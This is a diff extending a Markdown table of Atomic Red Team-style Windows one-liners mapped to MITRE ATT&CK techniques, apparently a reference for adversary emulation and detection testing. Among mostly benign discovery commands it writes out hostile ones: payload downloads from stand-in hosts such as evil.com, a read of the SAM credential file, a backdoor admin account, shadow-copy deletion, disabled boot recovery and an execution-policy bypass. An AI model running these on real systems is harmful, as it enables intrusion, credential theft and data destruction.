@@ -1,19 +1,34 @@
-# 🔥 Atomic Red Team One-Liners with MITRE ATT&CK Mapping
+# 🔥 Extended Atomic Red Team One-Liners with MITRE ATT&CK Mapping and OS
 
-|   # | Command                                                                                   | Description                             | MITRE Technique | MITRE Tactic          |
-|----:|--------------------------------------------------------------------------------------------|-----------------------------------------|------------------|------------------------|
-|   1 | powershell -Enc UwB0AGEAcgB0AC0AcwBsAGUAZQBwACAAMQAwAA==                                  | Obfuscated PowerShell                   | T1027.001        | Defense Evasion        |
-|   2 | certutil -urlcache -split -f http://example.com/evil.exe evil.exe                         | File download using certutil            | T1105            | Command and Control    |
-|   3 | reg add HKCU\...\Run                                                                       | Registry Run key persistence            | T1547.001        | Persistence             |
-|   4 | wmic process call create "powershell.exe -Command IEX ..."                                 | Executes command via WMIC               | T1047            | Execution               |
-|   5 | rundll32.exe javascript:"\..\mshtml,RunHTMLApplication "...                                | Executes JavaScript via rundll32        | T1218.011        | Defense Evasion        |
-|   6 | schtasks /create /tn "EvilTask" /tr "cmd.exe /c calc.exe" /sc minute /mo 5                 | Scheduled task creation                 | T1053.005        | Persistence             |
-|   7 | bcdedit /set {current} bootstatuspolicy ignoreallfailures                                 | Disables recovery boot                  | T1562.001        | Defense Evasion        |
-|   8 | powershell -Command "Get-Content C:\Windows\System32\config\SAM"                           | Access to SAM file                      | T1003.002        | Credential Access       |
-|   9 | net user backdoor Pass123! /add                                                            | Creates a user account                  | T1136.001        | Persistence             |
-|  10 | net localgroup administrators backdoor /add                                                | Adds user to admin group                | T1068            | Privilege Escalation    |
-|  11 | vssadmin delete shadows /all /quiet                                                        | Deletes shadow copies                   | T1490            | Impact                  |
-|  12 | curl http://evil.com/malware.ps1 -o malware.ps1                                            | File download using curl                | T1105            | Command and Control     |
-|  13 | bitsadmin /transfer myjob ...                                                              | File download using BITS                | T1197            | Command and Control     |
-|  14 | powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(...)"                           | Obfuscated PowerShell w/ bypass         | T1059.001        | Execution               |
-|  15 | echo malicious >> C:\Windows\System32\drivers\etc\hosts                                    | Modifies hosts file                     | T1565.001        | Impact                  |
+|   # | Command                                                                                   | Description                             | MITRE Technique   | MITRE Tactic            | Operating System |
+|----:|--------------------------------------------------------------------------------------------|-----------------------------------------|--------------------|--------------------------|------------------|
+|   1 | powershell -Enc UwB0AGEAcgB0AC0AcwBsAGUAZQBwACAAMQAwAA==                                  | Obfuscated PowerShell                   | T1027.001          | Defense Evasion          | Windows          |
+|   2 | certutil -urlcache -split -f http://example.com/evil.exe evil.exe                         | File download using certutil            | T1105              | Command and Control      | Windows          |
+|   3 | reg add HKCU\...\Run                                                                       | Registry Run key persistence            | T1547.001          | Persistence               | Windows          |
+|   4 | wmic process call create "powershell.exe -Command IEX ..."                                 | Executes command via WMIC               | T1047              | Execution                 | Windows          |
+|   5 | rundll32.exe javascript:"\..\mshtml,RunHTMLApplication "...                                | Executes JavaScript via rundll32        | T1218.011          | Defense Evasion          | Windows          |
+|   6 | schtasks /create /tn "EvilTask" /tr "cmd.exe /c calc.exe" /sc minute /mo 5                 | Scheduled task creation                 | T1053.005          | Persistence               | Windows          |
+|   7 | bcdedit /set {current} bootstatuspolicy ignoreallfailures                                 | Disables recovery boot                  | T1562.001          | Defense Evasion          | Windows          |
+|   8 | powershell -Command "Get-Content C:\Windows\System32\config\SAM"                           | Access to SAM file                      | T1003.002          | Credential Access         | Windows          |
+|   9 | net user backdoor Pass123! /add                                                            | Creates a user account                  | T1136.001          | Persistence               | Windows          |
+|  10 | net localgroup administrators backdoor /add                                                | Adds user to admin group                | T1068              | Privilege Escalation      | Windows          |
+|  11 | vssadmin delete shadows /all /quiet                                                        | Deletes shadow copies                   | T1490              | Impact                    | Windows          |
+|  12 | curl http://evil.com/malware.ps1 -o malware.ps1                                            | File download using curl                | T1105              | Command and Control       | Windows          |
+|  13 | bitsadmin /transfer myjob ...                                                              | File download using BITS                | T1197              | Command and Control       | Windows          |
+|  14 | powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(...)"                           | Obfuscated PowerShell w/ bypass         | T1059.001          | Execution                 | Windows          |
+|  15 | echo malicious >> C:\Windows\System32\drivers\etc\hosts                                    | Modifies hosts file                     | T1565.001          | Impact                    | Windows          |
+|  16 | whoami /priv                                                                               | Enumerate privileges of current user    | T1033              | Discovery                 | Windows          |
+|  17 | tasklist                                                                                   | List running processes                  | T1057              | Discovery                 | Windows          |
+|  18 | netstat -an                                                                                | Check active network connections        | T1049              | Discovery                 | Windows          |
+|  19 | net use \\\\evilserver\\share                                                              | Access network share                    | T1021.002          | Lateral Movement          | Windows          |
+|  20 | arp -a                                                                                     | Enumerate ARP table                     | T1016              | Discovery                 | Windows          |
+|  21 | nltest /dclist:domain                                                                      | List domain controllers                 | T1018              | Discovery                 | Windows          |
+|  22 | cmd.exe /c "echo hello > %temp%\\evil.txt"                                                 | Create file in temp folder              | T1059              | Execution                 | Windows          |
+|  23 | powershell Invoke-WebRequest -Uri http://evil.com -OutFile payload.exe                     | Download file via PowerShell            | T1105              | Command and Control       | Windows          |
+|  24 | reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall                   | Enumerate installed software            | T1518.001          | Discovery                 | Windows          |
+|  25 | net group "Domain Admins" /domain                                                          | List domain admins                      | T1069.002          | Discovery                 | Windows          |
+|  26 | net config workstation                                                                      | System info via net command             | T1082              | Discovery                 | Windows          |
+|  27 | cmd /c "for /L %i in (1,0,2) do @echo Looping..."                                          | Infinite loop test (harmless)           | T1499              | Impact                    | Windows          |
+|  28 | wmic product get name,version                                                              | Get installed programs                  | T1518.001          | Discovery                 | Windows          |
+|  29 | set                                                                                        | Dump environment variables              | T1082              | Discovery                 | Windows          |
+|  30 | sc query                                                                                   | Enumerate services                      | T1007              | Discovery                 | Windows          |
